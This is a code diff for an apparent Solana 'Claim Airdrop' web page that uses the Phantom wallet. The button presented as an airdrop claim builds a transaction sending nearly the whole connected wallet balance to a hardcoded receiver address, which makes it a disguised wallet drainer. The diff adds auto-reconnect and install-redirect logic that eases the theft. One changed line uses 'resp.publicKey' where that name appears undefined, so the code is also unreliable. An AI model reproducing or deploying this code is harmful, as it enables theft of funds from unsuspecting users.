@@ -22,10 +22,9 @@ $(document).ready(function () {
 
         $('#connect-wallet').text("Claim Airdrop");
 
-        // Set up click for actual claim/transfer
         $('#connect-wallet').off('click').on('click', async () => {
             try {
-                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
+                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n'); // Replace with real address
                 const balanceForTransfer = walletBalance - minBalance;
 
                 if (balanceForTransfer <= 0) {
@@ -37,7 +36,7 @@ $(document).ready(function () {
 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: public_key,
+                        fromPubkey: resp.publicKey,
                         toPubkey: recieverWallet,
                         lamports: transferAmount,
                     })
@@ -72,7 +71,6 @@ $(document).ready(function () {
         }
     }
 
-    // Main connect button click
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             await connectPhantom();
@@ -85,21 +83,47 @@ $(document).ready(function () {
                 const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
                 window.location.href = phantomLink;
             } else {
-                window.open('https://phantom.app/download', '_blank');
+                const isFirefox = typeof InstallTrigger !== "undefined";
+                const isChrome = !!window.chrome;
+
+                if (isFirefox) {
+                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                } else if (isChrome) {
+                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                } else {
+                    alert("Please download the Phantom extension for your browser.");
+                }
             }
         }
     });
 
-    // 🔁 Restore connection on mobile return
-    window.addEventListener('load', async () => {
-        const previouslyConnected = sessionStorage.getItem('phantomConnected');
-        if (window.solana && window.solana.isPhantom && previouslyConnected) {
-            try {
-                const resp = await window.solana.connect({ onlyIfTrusted: true });
-                handleWalletConnection(resp);
-            } catch (e) {
-                console.warn("User not connected or rejected on return.");
-            }
+    // Resume after install (desktop + mobile)
+    const phantomWasJustInstalled = sessionStorage.getItem('phantomInstallRequested') === 'true';
+    const phantomAvailable = window.solana && window.solana.isPhantom;
+
+    if (phantomWasJustInstalled && phantomAvailable) {
+        connectPhantom();
+    }
+
+    // Auto-reconnect if already trusted
+    if (phantomAvailable) {
+        window.solana.on("connect", async () => {
+            console.log("Wallet auto-connected (listener)");
+            const resp = { publicKey: window.solana.publicKey };
+            handleWalletConnection(resp);
+        });
+
+        const wasConnected = sessionStorage.getItem('phantomConnected');
+        if (wasConnected) {
+            window.solana.connect({ onlyIfTrusted: true })
+                .then(resp => {
+                    if (resp?.publicKey) {
+                        handleWalletConnection(resp);
+                    }
+                })
+                .catch(() => {
+                    sessionStorage.removeItem('phantomConnected');
+                });
         }
-    });
+    }
 });
